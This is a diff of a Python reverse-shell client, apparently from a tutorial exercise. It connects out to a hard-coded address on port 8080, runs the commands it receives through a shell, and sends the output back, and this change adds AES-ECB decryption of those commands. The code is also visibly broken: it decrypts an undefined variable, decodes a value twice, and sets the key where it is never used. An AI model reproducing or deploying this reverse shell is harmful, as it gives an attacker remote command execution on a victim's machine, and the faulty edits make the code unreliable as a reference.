@@ -9,14 +9,17 @@ import Padding
 
 password='hello'
 ival=10
+
+key = hashlib.sha256(password.encode()).digest()
+iv= hex(ival)[2:8].zfill(16)  
 #command is the data we will encrypt ie the plaintext
 
-def encrypt(plaintext,key, mode,iv):
-    encobj = AES.new(key,mode,iv)
+def encrypt(plaintext,key, mode):
+    encobj = AES.new(key,mode)
     return(encobj.encrypt(plaintext))
 
-def decrypt(ciphertext,key, mode,iv):
-    encobj = AES.new(key,mode,iv)
+def decrypt(ciphertext,key, mode):
+    encobj = AES.new(key,mode)
     return(encobj.decrypt(ciphertext))
 
 
@@ -35,9 +38,9 @@ def transfer(s, path):
 
 def connect():
     s = socket.socket()
-    s.connect(("192.168.1.183",8080))
+    s.connect(("10.174.15.6",8080))
     while True:
-        command = decrypt(s.recv(1024)
+        command = s.recv(1024)
         if "terminate" in command.decode():
             s.close()
             break
@@ -49,9 +52,15 @@ def connect():
             except:
                 pass
         else:
+            print("Decypting command")
+            plaintext = command
+            plaintext = decrypt(ciphertext,key,AES.MODE_ECB)
+            plaintext = Padding.removePadding(plaintext.decode(),mode=0)
+            #print ("  decrypt: "+plaintext)
+            
             # See the video above which explains how the subprocess element works
             # A pipe has two endpoints
-            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            CMD = subprocess.Popen(plaintext.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             
             #Capture the standout and send the output to the server
             s.send(CMD.stdout.read())
@@ -59,5 +68,9 @@ def connect():
             s.send(CMD.stderr.read())
 
 def main():
+    key = hashlib.sha256(password.encode()).digest()
+    
+    iv= hex(ival)[2:8].zfill(16)    
+
     connect()
 main()
